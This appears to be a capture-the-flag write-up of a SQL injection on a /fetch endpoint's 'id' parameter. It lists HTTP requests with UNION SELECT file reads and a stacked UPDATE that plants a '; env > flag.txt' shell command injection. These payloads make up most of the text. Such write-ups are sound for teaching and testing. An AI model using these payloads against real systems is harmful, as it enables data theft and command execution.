## Use case

The application was vulnerable to SQL injection through the 'id' parameter in the /fetch endpoint, allowing attackers to execute arbitrary SQL commands and extract sensitive data. This vulnerability matters as it can lead to data exfiltration and remote command execution.

## Steps to test

1. Send a GET request to /fetch?id=1 to identify the SQL injection point.
2. Send a GET request to /fetch?id=0 UNION SELECT 'main.py'-- to discover the database structure.
3. Send a GET request to /fetch?id=1; UPDATE photos SET filename='; env > flag.txt' WHERE id=3; COMMIT;-- to execute a command injection.
4. Send a GET request to /fetch?id=4 UNION SELECT 'flag.txt'-- to retrieve the contents of the flag.txt file.

## Commands

```text
GET /fetch?id=1
GET /fetch?id=0 UNION SELECT 'main.py'--
GET /fetch?id=1; UPDATE photos SET filename='; env > flag.txt' WHERE id=3; COMMIT;--
GET /fetch?id=4 UNION SELECT 'flag.txt'--
GET /fetch?id=1; UPDATE photos SET filename="; env > flag.txt" WHERE id=3; COMMIT; -- HTTP/1.1
# Vulnerability discovery
GET /fetch?id='
GET /fetch?id=0 UNION SELECT 'main.py'--
# Command injection

# Trigger execution
GET / HTTP/2
# Retrieve flag
GET /fetch?id=4%20UNION%20SELECT%20'flag.txt'%20-- %20HTTP/1.1
```
